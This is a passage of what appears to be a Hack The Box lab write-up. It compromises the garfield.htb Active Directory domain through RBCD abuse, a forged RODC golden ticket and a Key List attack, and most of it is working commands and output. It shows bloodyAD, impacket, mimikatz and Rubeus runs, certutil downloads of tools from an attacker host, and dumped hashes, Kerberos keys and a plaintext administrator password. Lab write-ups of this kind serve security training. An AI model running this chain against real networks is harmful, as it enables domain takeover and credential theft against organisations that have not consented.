Name              : Server Operators
ObjectClass       : group
ObjectGUID        : e5e03394-d8c8-4123-a100-8bb3a34898a1
SamAccountName    : Server Operators
SID               : S-1-5-32-549

DistinguishedName : CN=Denied RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
Name              : Denied RODC Password Replication Group
ObjectClass       : group
ObjectGUID        : f24e7edd-b7b0-4030-a09e-2c49d2e97a1e
SamAccountName    : Denied RODC Password Replication Group
SID               : S-1-5-21-2502726253-3859040611-225969357-572

DistinguishedName : CN=Administrators,CN=Builtin,DC=garfield,DC=htb
Name              : Administrators
ObjectClass       : group
ObjectGUID        : a4ab2eba-4ac5-45ef-a29c-89216814593e
SamAccountName    : Administrators
SID               : S-1-5-32-544
```

- 🔍 *As Expected The CN=Administrators is in Denied list. so we need to remove it from the denied list and as well, add it to the allowed list*
- 🔍 *After Searching for a while, we have WriteAccountRestriction over RODC01, so we can use some of the attributes*
- 🔍 *But here's a catch l.wilson_adm is in Tier-01 OU, and to abuse WriteAccountRestrictions, we need Tier-0 level privileges. so now we can't directly use those security attributes from this group, we need to escalate*
- 🔍 *Since we are in Tier-01 and every member/Object of Tier-01 has addSelf privilges over Administrator(which is a Tier-0 OU). we can then use these WriteAccountRestriction Privileges.*

> [!IMPORTANT]
> **Why addSelf to RODC01 Administrators first?**
> Because WriteAccountRestrictions on RODC01 was granted to the RODC Administrators group, not directly to l.wilson_adm.
> 
> ```text
> l.wilson_adm
>     ↓ MemberOf
> Tier1 group
>     ↓ addSelf right
> RODC Administrators group
>     ↓ has WriteAccountRestrictions
> RODC01$ object
> ```

- 🔍 *Okay lets Exploit now, by first adding l.wilson_adm to Administrator*

```bash
proxychains bloodyAD -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' --host 192.168.100.1 add groupMember "RODC Administrators" "l.wilson_adm"
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:389  ...  OK

[+] l.wilson_adm added to RODC Administrators
```

- 🔍 *Now we need to use the msDS-AllowedToActOnBehalfOfOtherIdentity (the RBCD attribute). to Create a Fake object that will impersonate with Administrator*

> [!IMPORTANT]
> **Why are we Creating this Fake Account, while we can just use the WriteAccountRestriction Privileges?**
> We are creating this new account to get a TGS for Administrator and then later on get a shell for Administrator of RODC. Why? Normally DC uses krbtgt account to sign tickets, as RODC is a semi-DC it has its own Separate account to sing tickets something like `krbtgt_1234`.
> 
> **Why do we need this krbtgt_1234 of RODC?**
> It has a Signing key, that we will use later on to get a Golden ticket for administrator on DC01, and DC01 will return us its real krbtgt key material AES-256 encoded, which can later be used to forge the ticket for any User.
> 
> ```text
> krbtgt_8245 (RODC signing key)
>     ↓ forge RODC Golden Ticket for Administrator
> Forged TGT presented to DC01
>     ↓ Key List Attack
> DC01 returns real krbtgt AES256 key material
>     ↓
> Real krbtgt hash → forge tickets for ANY user on ANY machine
>     ↓
> Full Domain Compromise of DC01
> ```

- 🔍 *So now that we are in RODC administrators lets abuse RBCD*
- 🔍 *Lets First create a new account*

```bash
proxychains impacket-addcomputer garfield.htb/l.wilson_adm:'NewPassword123!' -computer-name 'FAKEBOX$' -computer-pass 'FakePass123!' -dc-ip 192.168.100.1
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:445  ...  OK

[*] Successfully added machine account FAKEBOX$ with password FakePass123!.
```

- 🔍 *Now lets Set msDS-AllowedToActOnBehalfOfOtherIdentity (the RBCD attribute)*

```bash
proxychains impacket-rbcd garfield.htb/l.wilson_adm:'NewPassword123!' -dc-ip 192.168.100.1 -action write -delegate-to 'RODC01$' -delegate-from 'FAKEBOX$'
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:389  ...  OK

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKEBOX$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKEBOX$     (S-1-5-21-2502726253-3859040611-225969357-10601)
```

- 🔍 *RBCD Abused!*
- 🔍 *Now that we can act ON behalf of any user, lets act as administrator!!*

```bash
proxychains impacket-getST garfield.htb/FAKEBOX$:'FakePass123!' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 192.168.100.1
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:88  ...  OK
[*] Impersonating Administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:88  ...  OK
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

- 🔍 *Ensure the TGS*

```bash
klist
```

```text
Ticket cache: FILE:Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
Default principal: Administrator@garfield.htb

Valid starting       Expires              Service principal
04/11/2026 22:58:00  04/12/2026 08:57:58  cifs/RODC01.garfield.htb@GARFIELD.HTB
        renew until 04/12/2026 22:57:57
```

- 🔍 *Lets get the shell!*

```bash
proxychains impacket-wmiexec -k -no-pass garfield.htb/Administrator@RODC01.garfield.htb
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:49667  ...  OK
[*] Launching semi-interactive shell - Careful what you execute
[*] Press help for extra shell commands

C:\>whoami
garfield\administrator
```

- 🔍 *Now to Get the signing ticket for RODC krbtgt_1234 account, we need to use mimikatz that will extract all the info*

```bash
# On Kali:
cd x64
python3 -m http.server 9500
```

```cmd
# On Target:
C:\> certutil -urlcache -f http://10.10.14.253:9500/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```cmd
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 26A4-B0BC

 Directory of C:\

04/01/2026  12:16 PM    <DIR>          inetpub
04/11/2026  04:02 PM         1,250,056 mimikatz.exe
11/05/2022  11:58 AM    <DIR>          PerfLogs
08/16/2025  04:47 PM    <DIR>          Program Files
08/17/2025  06:55 AM    <DIR>          Program Files (x86)
08/17/2025  07:35 AM    <DIR>          Users
04/11/2026  04:02 PM    <DIR>          Windows
               1 File(s)      1,250,056 bytes
               6 Dir(s)   3,248,615,424 bytes free
```

- 🔍 *mimikatz is send!*
- 🔍 *Lets the Dump the signing key now*

```cmd
C:\>.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

```text
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

* Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   :
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

* WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

* Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

* Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240  #Key
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

* NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit
Bye!
```

- 🔍 *We got the key!*
- 🔍 *Now Before asking for real krbtgt password hash from DC01, we need to add administrator of RODC to allowed list of key_list and need to also remove from denied list!*
- 🔍 *Lets first add the administrator in allowed list*

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb' -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:389  ...  OK

[+] RODC01$'s msDS-RevealOnDemandGroup has been updated
```

- 🔍 *Now Lets remove from denied list*

```bash
proxychains bloodyAD --host 192.168.100.1 -d garfield.htb -u l.wilson_adm -p 'NewPassword123!' set object 'RODC01$' msDS-NeverRevealGroup
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.1:389  ...  OK

[+] RODC01$'s msDS-NeverRevealGroup has been updated
```

- 🔍 *Now we are on allowed list, means we can forge a golden ticket which will trick the DC01 to give us the signing key for real krbtgt, which we will use to compromise the full domain!*
- 🔍 *Lets send rubeus*

```bash
# On Kali:
cd Tools/Rubeus
python3 -m http.server 9500
```

```cmd
# On Target:
C:\>certutil -urlcache -f http://10.10.14.253:9500/Rubeus.exe Rubeus.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

```cmd
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 26A4-B0BC

 Directory of C:\

04/01/2026  12:16 PM    <DIR>          inetpub
04/11/2026  04:02 PM         1,250,056 mimikatz.exe
11/05/2022  11:58 AM    <DIR>          PerfLogs
08/16/2025  04:47 PM    <DIR>          Program Files
08/17/2025  06:55 AM    <DIR>          Program Files (x86)
04/11/2026  04:16 PM           446,976 Rubeus2.exe
08/17/2025  07:35 AM    <DIR>          Users
04/11/2026  04:16 PM    <DIR>          Windows
               2 File(s)      1,697,032 bytes
               6 Dir(s)   3,248,033,792 bytes free
```

- 🔍 *Rubeus is there, now lets forge a golden ticket with the signed key we got earlier*

```cmd
C:\>.\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:administrator.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
```

```text
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|\____/|____/|_____)\____/(___/

   v2.2.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/11/2026 4:19:53 PM
[*] StartTime      : 4/11/2026 4:19:53 PM
[*] EndTime        : 4/12/2026 2:19:53 AM
[*] RenewTill      : 4/18/2026 4:19:53 PM

[*] base64(ticket.kirbi):

      doIFRzCCBUOgAwIBBaEDAgEWooIENDCCBDBhggQsMIIEKKADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4ID7DCCA+igAwIBEqEDAgEDooID2gSCA9bwmfAX8X2xSHZ3IR+8hLEO+cc06dgjXNw1JPQmtrgUqSuwoxvnenMuwkYRuuLvfGkOHneQOhzKF14GtUUG5XkhW9CC/88JQoYwJOhMBfQeqM9NfYCTrIXWyhEFc3yrE/pZGQEgn+3RsQTI4pAs0LK/qL2KhikXFiLxQ8UZ7+JZRZdqNFRYKwhj/gSRA74rijVx8dgNasGOqy8qS6IsNQ35fNYlEypIQpypYSM9OFtRx0Npw+6gtriHjYIltwm18LMdHY5aOqT9w1qsc56JhV/2w3AqgtlgusVQOq8lBVvq3OxV6P7QBW0yKb/AIC/CmKuVrdyNfzfjLdSs+dbHeOBYylV0CWKUlZN5na8eiGpSKZvsdWHRRH5A2Uk7P9PN8QkXaJ0au5+kEOkw/p/77PidW8vBKz1/4NTBuNJmDDp/exFSNuLanuHbOgRxs/AF6e5gxaY0P7N7AA7j0rOWsxmOC8sFpyo2rkK6qwzowE+gbRqgnFFlx3YnRd6Liuzj7WhYvJCnrTb/rOJ8zQcWI595dt9UzK7ZpFt4ERbZflQP01wRznhUWIasFBnu8Lc12mKUqpuBe4EN0OinpaIRALaMPV5K60QeE9XvgYzoXVZMlRbZjivIZLhSpbZ9+U7hDGEeImhC6W0m6jsVy5WYmeqw+6EiO7bDcCGxdVbbt0kjPghoEsa4KeC+6y7I9vejHUNa7pUjhCE2zhiYIEnnBMWa5ZjbKQQUXrGz6pSoKpxme1P3PWrq9HzBCyTgOh4H7M2Bic2gkoQrnYb5sghDiCmCcQvbMWeqnYdqJ8oyNbP5s+t55JVORtgqXiyeieAnTSksGIwdTZxpazRcVk9fUWIkUG4oS0xIEdMcBUSv6HyDMxvD9AvJ7aKY+Vn6/fMuBd10D/8vfhve/R8hD97E0Edllqhin6CNyBSFUYmCabqaf/iCvQ43oyQgR65nNhLbDu8h4EhABL8iPBwvohmRiJCr3wCvKXa7GZaNh6j3BpBbUJ/aa2+ea5U/rQcJ4vwjT4ZErubCnCiWJROi3wZjBdEBv41gie8afMENBqQRerqrUZX9BIYSf4Cj9e1AfM2A/XwB+eXo07rDwJ7ivt7mZEjfDLQxugm80GlxdJXq/TfvRv4Td3/7GyDIQ3AtflSRvEpVRDGnxf4dq6DnQzGCu1e+qSByk/5EAn55N9fZ8wyoXKI0NCRRhBvLWhA4rSCYg/uBfc+PQ8yGld2ocUIQO+zil2ssvI7LfqZ5ylUYRj61seoDQbEWBzCI+AGt2448c9pFcYYYUUcfdwCyOqDDlOG4w9FRbSWAo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQg8Ob3LrGsm13xtfViFbAT7InG6OKQ6Zxy8CVzPcfuHUihDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDQxMTIzMTk1M1qlERgPMjAyNjA0MTEyMzE5NTNaphEYDzIwMjYwNDEyMDkxOTUzWqcRGA8yMDI2MDQxODIzMTk1M1qoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=

[*] Ticket written to administrator_2026_04_11_23_19_53_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

- 🔍 *We got the golden ticket, now lets ask for real krbtgt password hash!*

> [!NOTE]
> The commands of Rubeus will only succeed if you have version v2.3.3, this version won't work!

- 🔍 *Now lets perform KeyList attack!*

> [!IMPORTANT]
> **Key List Attack Explanation:**
> Think of it like this:
> - **Normal Kerberos:** You → show TGT to DC → DC gives you a service ticket
> - **Key List Attack:** You → show RODC Golden Ticket to DC01 → DC01 thinks: "my RODC is asking for key sync" → DC01 hands back real krbtgt hash.
> 
> **Why Does It Work?**
> Microsoft built a feature called Key List so that RODCs can ask DC01: *"Hey, what's the current password hash for this user?"*
> This is a legitimate replication feature — RODCs need to stay in sync with DC01.
> 
> We abuse it by:
> 1. Forging a ticket that looks like it came from our RODC (The Golden Ticket we forged with administrator from RODC).
> 2. Presenting it to DC01 as if we're the RODC asking for a sync (KeyList Attack).
> 3. DC01 checks: *"is Administrator allowed to be cached on this RODC?"* → Yes (we added it via PRP Attributes).
> 4. DC01 hands over the real password hash (The Base64 encoded, ticket hash).

- 🔍 *Lets perform the attack now!*

```cmd
C:\temp>.\Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:administrator_2026_04_18_22_42_32_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
```

```text
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|\____/|____/|_____)\____/(___/

   v2.3.3 

[*] Action: Ask TGS

[*] Requesting 'aes256_cts_hmac_sha1' etype for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC01.garfield.htb (10.129.39.117)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFOGusJV8fSPb4Ee4B32HKBo5qxY5meBom64yIN3Pq0LNZeP644AqH3OAeCgqi+7wgZ3alnxnAtX9Q7IsXlVKCyNrfL0eqs5z6VjjLuXOJ71iqIosJ5zOr/HWZRuMOXuceatP9yx77UCLGqxfd4FIYmxhs8UUPP8oKpcuYS7+FTVVgcatzyR9bk0hlEBgN2DwmxcNjJFhPaadVlQwm9nhyWScrPMOd/ntLKj5TMDEA92CB9x6ZVO5jJc5nAGZ9p+if6X3Xzu+Wr+sXKL5dJn49Q6pEzTerpEarTTT9+9o8xFqDrgiybLiexXVPytSApLn0fYSviO9vBNRc5Vx3IireheRW+kKOVq4hWiCV847S1LsK8eHVAWkq8541zhZmxKKkyNhOmUiWTYUs/J3NHembq6LFsRGtNl5IWSAzv+mgFUZtkLLYPbF9qLZ3KDGlmP5vrRzUC05DX8E+Us6qcjjamijDvbP5S2hNrKBwDkJBWOMpLPk1zREo2NJSr/ZofvgMYr1fvGjy3j+w19vFN9kFBBcZAnXrd5B96O7DXIQ0bG32EASCcXOwhKM1cj1vJurctdaajvyBwFs+eIzTmCsKMLHN/B4i0O/WdOi4fWnAkb3qoUI07a+n4LhvrY+jnwAk2opIhDmT603LgFz7sjt+F4f04E5QWiy5dWjE5u9QJ/a7WmckbmIDIB0oG6zSlUAO6pZfP3afGR46q8duVllJajgDwQdLYeF21UkEhuguVpda3U1fNyYdff6+mBIebchV9mbSPozLJwZmjUNfGMu5eE4OlmVdPZgww4dEJEDLwgnb6QYbN46xs1gOf0DD06rjIyoRFeA4J0m6HERoly8GxIs8JqJ1HwZalhUawt8NgYHEX4IsiKJf1mpoNDFISMzENFjr6x/VxEC35Wh9FPPMTTR5DCTOuGMWOv83pre4gGkVb9WEJkiOzT1X/kPTZE3CB50/cD13jnuAgWGQkhArLXqDE/38RfPdbASF6P7Hxd1oQGQgoxZkxzR4PPyjCyiEGB5mbjRaxZb2Txbh0jxt925zmr3GoKTVG204syGWdG7BQC4swozT6C6hXYnSmo9iPllRdhOIwpBK33R8Q7eYfXmLGb9gSS4SHE/FnP3db5eouc0nUp8PSE3HU8ioyZQOWfE/XN44jGZlkSIjUjCCA7w6IBYbg73L2Hsrl0lDLVNZsD8xVYIDF4zpuKek9pDm7LP9uo6BwMIAnVK+3TiSFvgRxYSDKXHzwv5ZLAGs7STXTrk0bicscPJ0yOw3+fkSyAvrF9G3d482ltL0JhyFXs2bPShA8K8tMq3NXD8UvnQtiOalyHArPeG3lJ5PpNHu2i3Tl+kbH39N38RLRNKCRWLdkhRGNY2mtVJ9r8L83V96NxjGMjgvSJgs8zLHZbDpoLWM64Fa8yC6N/iW8UUI8pHfvvkijVXRRxMhuY8PFpfaOREdhnp8Xi1jqT2DrGf2OBca2jgdgwgdWgAwIBAKKBzQSByn2BxzCBxKCBwTCBvjCBu6ArMCmgAwIBEqEiBCBCqvGca3mllYGaTfmdJF0gequ5+M6jnoTpbrgNKHFkOqEOGwxHQVJGSUVMRC5IVEKiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQAAAQAApREYDzIwMjYwNDE4MjI0NTQzWqYRGA8yMDI2MDQxOTA4NDIzMlqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxHQVJGSUVMRC5IVEI=

  ServiceName              :  krbtgt/GARFIELD.HTB
  ServiceRealm             :  GARFIELD.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  GARFIELD.HTB
  StartTime                :  4/18/2026 3:45:43 PM
  EndTime                  :  4/19/2026 1:42:32 AM
  RenewTill                :  1/1/0001 12:00:00 AM
  Flags                    :  name_canonicalize
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  QqrxnGt5pZWBmk35nSRdIHqrufjOo56E6W64DShxZDo=
  Password Hash            :  EE238F6DEBC752010428F20875B092D5
```

- 🔍 *we got the base64 key hash!*
- 🔍 *Now we need to convert it in a .ccache format so we can use it to dump secrets.*

```bash
# 1. Save:
echo -n 'BASE64_HERE' | tr -d ' \r\n\t' | base64 -d > ticket.kirbi

# 2. Convert:
ticketConverter.py ticket.kirbi ticket.ccache
```

```text
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
```

```bash
# 3. Export:
export KRB5CCNAME=ticket.ccache

# 4. Ensure:
klist
```

```text
Ticket cache: FILE:ticket.ccache
Default principal: Administrator@GARFIELD.HTB

Valid starting       Expires              Service principal
04/18/2026 22:45:43  04/19/2026 08:42:32  krbtgt/GARFIELD.HTB@GARFIELD.HTB
```

- 🔍 *Now That we have a valid TGS for Garfield Domain Admin, we can dump secrets (or you can directly get the winrm shell!)*

```bash
proxychains impacket-secretsdump -k -no-pass DC01.garfield.htb
```

```text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.garfield.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  GARFIELD.HTB:88  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x3eeaa6e0c8c5b5be0c19c58f0c71f014
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
GARFIELD\DC01$:plain_password_hex:0bdfc156535660c8292b7b8a98c74544c56e4ba4944fa6e2150a4afb9385236bbbbfe84d92e193acec79d1b12ef2019da135b8cb27f53c7728715e75b21b8c484716563e0b6bb02113fadd9417ed27aee068731fdb0ec42881751ddf660f3c7b29cc00d49173587c73f3858663a7dc19bd8a3de284ce59d2f55018ff5209996c75fa848c8a3673b5c102e0ecac2907ed348a93433629d2b9a0d6897577f9327b1b5f3bb298b51c5c0e2ba43b6681a3e378a05c66dad3ae956c476a1016e2d8296d1242e7303d08f5507dbecd8c8d7511faba0447ab4239000327b11831bbb81dac956f4f7f528df6a47718a955c4cb76
GARFIELD\DC01$:aad3b435b51404eeaad3b435b51404ee:22acecfd924465afc92bf3c3631bbc91:::
[*] DefaultPassword 
GARFIELD\Administrator:lgoSWZnv0phWaNFu
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2846306ece4ab4cf7f560eb78abd9a7a91a5547b
dpapi_userkey:0x23ff54708c0bc15ea32ef626ea611b79dbc65ae6
[*] NL$KM 
 0000   1C 9C 0A 77 63 CF 69 B8  B0 9E E4 5A 30 17 EF B0   ...wc.i....Z0...
 0010   1D C0 BD DE DD C1 B0 12  74 62 5B 89 5F 10 96 F5   ........tb[._...
 0020   CE 7C EE 70 68 FE 49 CA  C1 38 CC 41 D8 88 C9 99   .|.ph.I..8.A....
 0030   EE 0B 37 47 A1 43 F0 C3  B5 9A FB DE C1 A1 0A BB   ..7G.C..........
NL$KM:1c9c0a7763cf69b8b09ee45a3017efb01dc0bddeddc1b01274625b895f1096f5ce7cee7068fe49cac138cc41d888c999ee0b3747a143f0c3b59afbdec1a10abb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.garfield.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.garfield.htb:49667  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  GARFIELD.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
